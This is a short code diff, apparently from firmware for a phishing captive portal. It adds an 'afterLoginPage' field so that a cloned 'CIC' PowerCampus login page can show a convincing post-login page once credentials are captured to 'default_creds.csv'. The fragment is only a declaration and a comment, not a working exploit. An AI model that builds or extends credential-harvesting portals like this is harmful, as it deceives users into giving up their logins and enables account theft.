@@ -69,6 +69,10 @@ private:
     String outputFile = "default_creds.csv";
 
     String htmlPage;
+    // Optional post-login landing page served after creds are submitted (CIC clone
+    // uses it to mimic the real PowerCampus home). "__USERNAME__" is replaced with the
+    // typed user name at request time. Empty => fall back to the neutral "signing in" page.
+    String afterLoginPage = "";
     String htmlFileName;
     bool isDefaultHtml = true;
     FS *fsHtmlFile;
